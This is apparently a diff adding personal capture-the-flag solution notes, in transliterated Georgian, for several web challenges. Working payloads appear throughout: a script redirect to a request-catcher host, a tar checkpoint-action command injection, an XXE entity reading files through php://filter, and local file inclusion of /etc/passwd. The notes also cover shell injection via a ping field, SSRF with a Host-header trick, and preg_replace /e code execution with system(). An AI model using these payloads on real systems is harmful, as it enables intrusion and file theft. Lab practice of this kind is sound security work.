@@ -1,0 +1,60 @@
+manual-review: <script>
+window.location.href = "https://kote.requestcatcher.com/test";
+</script> ( anu viyenebt rame request catchers)
+da orives ro daarefresheb flags amoagdebs
+--------------
+
+
+
+tartarssousage: viewpage sorucehsi ro vanxavt html links gadavalt magaze ,
+mer eurlshi moavshlit viewpagesources da commandis velshi gavushvebt --- "cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat
+enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag""
+----------
+syntax-check: pasrse ro davawvbeit mivigebt axal links, 
+romelsac chavagdebt burpsuites proxyshi da gavgzvanit REPEATER-s,
+romelsi requestshic chavamatebt: 
+---------
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM
+"php://filter/convert.base64-encode/resource=/var/www/html/flag">
+]>
+<foo>
+&xxe;
+</foo> 
+
+da mere base64 decode  
+--------
+alien-inclusion:  curl 'http://34.107.71.117:34287/?start=
+ ' --data ' start=flag.php'
+
+---
+
+ping station: 8.8.8.8;cat flag
+
+
+
+-------
+
+ltra-crawler:es LFI (local file inclsuionsze) vulnarble aris, 
+romelic gaviget=`file:///etc/passwd`,  
+burpsuitit payloadebs ro vagzvanit ragaca martivs 'url=file:///etc/passwd', 
+vigebt rom es aeis python soruce code da "/home/ctf'shi ari flag, amito viyenebt: curl 34.107.71.117:32141 --data 'url=file:///home/ctf/app.py', 
+vgebt from company.tld tu iqneba headshi aigebt flags, 
+amis shemdeg burpsutshi hostis nacvlad vwert company.tld da vigebt flags
+
+-----------
+
+
+subtitue: sitze viyenebt--http://34.107.71.117:30298/index.php?vector=/Admin/e&replace=kote tu icvleba da icvleba,
+ amito axla viyenebt---http://34.107.71.117:30298/index.php?vector=/Admin/e&replace=system(ls) 
+da xvedvat file sadaacaa amito axla viyenebt -- http://34.159.104.59:31748/index.php?vector=/Admin/e&amp;replace=system(&#39;cat here_we_dont_have_flag/flag.txt&#39;) vigebt flags
+
+
+
+
+
+
+
+
